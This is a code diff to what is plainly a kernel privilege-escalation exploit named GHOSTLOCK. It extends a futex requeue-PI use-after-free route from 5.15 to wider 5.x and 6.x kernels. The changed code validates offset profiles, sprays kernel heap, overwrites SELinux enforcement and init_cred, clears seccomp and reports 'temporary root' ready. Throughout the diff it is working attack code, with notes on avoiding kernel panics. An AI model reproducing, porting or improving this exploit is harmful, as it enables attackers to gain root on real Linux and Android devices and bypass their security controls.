@@ -109,14 +109,46 @@ static int validate_offsets_profile(const struct kernel_offsets *entry) {
     pr_error("offset profile is incomplete\n");
     return -1;
   }
-  if (strncmp(entry->uname_r, "5.15.", 5) == 0) {
+  if ((entry->kernel_major != 5 && entry->kernel_major != 6) ||
+      !entry->cred_copy_size ||
+      entry->cred_usage_offset + sizeof(uint32_t) > entry->cred_copy_size ||
+      !entry->cred_caps_count ||
+      entry->cred_caps_offset + entry->cred_caps_count * sizeof(uint64_t) >
+          entry->cred_copy_size || entry->cred_ref_count > 4) {
+    pr_error("offset profile has no valid kernel family or credential template\n");
+    return -1;
+  }
+  const uint32_t cred_ref_offsets[] = {
+      entry->cred_ref0_offset, entry->cred_ref1_offset,
+      entry->cred_ref2_offset, entry->cred_ref3_offset,
+  };
+  const uint64_t cred_ref_images[] = {
+      entry->cred_ref0_image, entry->cred_ref1_image,
+      entry->cred_ref2_image, entry->cred_ref3_image,
+  };
+  for (uint32_t i = 0; i < entry->cred_ref_count; i++) {
+    if (!cred_ref_images[i] ||
+        cred_ref_offsets[i] + sizeof(uint64_t) > entry->cred_copy_size) {
+      pr_error("offset profile credential reference %u is invalid\n", i);
+      return -1;
+    }
+  }
+  if (entry->kernel_major == 5) {
     if (!entry->off_empty_zero_page || !entry->off_mcast_fake_bss ||
         !entry->compact_waiter ||
-        entry->mm_struct_sz != 0x400 ||
+        !entry->mm_struct_sz ||
         entry->mcast_waiter_off <= 0 ||
-        entry->mcast_waiter_off + 0x50 > 0x108) {
-      pr_error("5.15 profile requires empty_zero_page, compact waiter, "
-               "mm_struct stride 0x400, and a valid multicast waiter offset\n");
+        !entry->mcast_buffer_size ||
+        entry->mcast_waiter_off + entry->mcast_lock_offset + sizeof(uint64_t) >
+            entry->mcast_buffer_size ||
+        !entry->mcast_task_offset || !entry->mcast_lock_offset ||
+        !entry->mcast_fake_lock_offset || !entry->mcast_fake_task_offset ||
+        !entry->mcast_lock_slots_offset ||
+        !entry->mcast_lock_slot_count || !entry->mcast_lock_slot_stride ||
+        entry->cred_copy_size < 0xa0 || !entry->cred_ref_count) {
+      pr_error("5.x profile requires empty_zero_page, compact waiter, "
+               "credential references, an mm_struct stride, and complete "
+               "multicast geometry\n");
       return -1;
     }
   }
@@ -268,11 +300,11 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   }
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  if (active_offsets && active_offsets->mcast_waiter_off) {
-    do_mcast_fake_lock_route();
+  if (kernel5_route_selected()) {
+    do_kernel5_fake_lock_route();
     /* remove_waiter() left this thread's pi_blocked_on pointing at the
      * reclaimed stack waiter. Force one final slow-path removal while the
-     * stack frame is still alive, matching the 5.15 multicast primitive's
+     * stack frame is still alive, matching the 5.x multicast primitive's
      * disarm step. Without this, thread exit leaves a walkable dangling
      * ghost and the next mm_struct spray can panic the kernel. */
     uint32_t dummy_pi = 0x80000000U | (uint32_t)getpid();
@@ -411,16 +443,15 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
    * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
-  if (active_offsets && active_offsets->mcast_waiter_off &&
-      getenv("GHOSTLOCK_515_RESIDENT")) {
-    if (!mcast_resident_start()) {
-      pr_warning("resident multicast setup failed\n");
+  if (kernel5_route_selected() && getenv("GHOSTLOCK_5X_RESIDENT")) {
+    if (!kernel5_resident_start()) {
+      pr_warning("5.x resident multicast setup failed\n");
       clear_pselect_write();
       return 0;
     }
     uintptr_t value = leaf ? 0 : (mode == 2 ? data_addr(g_init_cred_image)
                                              : data_addr(EMPTY_ZERO_PAGE));
-    int ok = mcast_resident_write(target, value);
+    int ok = kernel5_resident_write(target, value);
     clear_pselect_write();
     return ok;
   }
@@ -970,7 +1001,7 @@ static int retry_write_stage(
      * before paying for another heap spray */
     if (attempt > 1 && verify(context)) return 1;
     if (attempt == 1) slab_drain();
-    if (mode == 2 && active_offsets && active_offsets->mcast_waiter_off) {
+    if (mode == 2 && kernel5_route_selected()) {
       pselect_child_node = 0;
       set_pselect_write_mode(data_addr(g_init_cred_image) + 8, 1);
       page_base = prepare_good_kernel_page();
@@ -989,7 +1020,7 @@ static int retry_write_stage(
       usleep(100000);
       continue;
     }
-    if (mode == 2 && active_offsets && active_offsets->mcast_waiter_off) {
+    if (mode == 2 && kernel5_route_selected()) {
       /* Swap to the already sprayed leaf payload and repair static init_cred
        * immediately, avoiding another multi-second collision search while
        * PID 1 shares the corrupted credential. */
@@ -1120,11 +1151,15 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
-  if (getenv("GHOSTLOCK_515_PHASE1_PROBE")) {
-    pr_info("5.15 phase-1 probe: cycle/stamp/adjust/disarm only\n");
-    int ok = mcast_resident_start();
-    if (ok) mcast_resident_stop();
-    pr_info("5.15 phase-1 probe result=%s\n", ok ? "pass" : "fail");
+  if (getenv("GHOSTLOCK_5X_PHASE1_PROBE")) {
+    if (!kernel5_route_selected()) {
+      pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
+      return 1;
+    }
+    pr_info("5.x phase-1 probe: cycle/stamp/adjust/disarm only\n");
+    int ok = kernel5_resident_start();
+    if (ok) kernel5_resident_stop();
+    pr_info("5.x phase-1 probe result=%s\n", ok ? "pass" : "fail");
     return ok ? 0 : 1;
   }
 
@@ -1136,19 +1171,19 @@ int run_exploit(int argc, char **argv) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
     TIMER("pre-W1 drain");
-    int w1_attempts = (active_offsets && active_offsets->mcast_waiter_off &&
-                       !getenv("GHOSTLOCK_515_RESIDENT")) ? 1 : 15;
+    int w1_attempts = (kernel5_route_selected() &&
+                       !getenv("GHOSTLOCK_5X_RESIDENT")) ? 1 : 15;
     selinux_ok = retry_write_stage(
         "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, w1_attempts, 100000,
         verify_selinux_stage, NULL, 0);
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
-      mcast_resident_stop();
+      kernel5_resident_stop();
       return 1;
     }
-    if (active_offsets && active_offsets->mcast_waiter_off &&
-        !getenv("GHOSTLOCK_515_RESIDENT")) {
-      uintptr_t w1_scratch_poison = page_base + 0x108;
+    if (kernel5_route_selected() && !getenv("GHOSTLOCK_5X_RESIDENT")) {
+      uintptr_t w1_scratch_poison =
+          page_base + active_offsets->mcast_buffer_size;
       if (!quarantine_reclaim_sockets()) {
         pr_warning("W1 scratch page quarantine failed\n");
         return 1;
@@ -1171,14 +1206,14 @@ int run_exploit(int argc, char **argv) {
         return 1;
       }
     }
-    if (active_offsets && active_offsets->mcast_waiter_off &&
-        getenv("GHOSTLOCK_515_RESIDENT")) {
+    if (kernel5_route_selected() && getenv("GHOSTLOCK_5X_RESIDENT")) {
       uintptr_t repair =
-          (data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss) + 0x1200)
+          (data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss) +
+           active_offsets->mcast_fake_lock_offset)
                          & ~(uintptr_t)0x1fffff;
-      if (!mcast_resident_write(data_addr(SELINUX_ENFORCING) + 4, repair)) {
+      if (!kernel5_resident_write(data_addr(SELINUX_ENFORCING) + 4, repair)) {
         pr_warning("W1 policycap repair failed\n");
-        mcast_resident_stop();
+        kernel5_resident_stop();
         return 1;
       }
     }
@@ -1465,7 +1500,7 @@ int run_exploit(int argc, char **argv) {
     pr_warning("temporary root ready; KernelSU module load pending\n");
   else
     pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
-  mcast_resident_stop();
+  kernel5_resident_stop();
   return 0;
 }
 
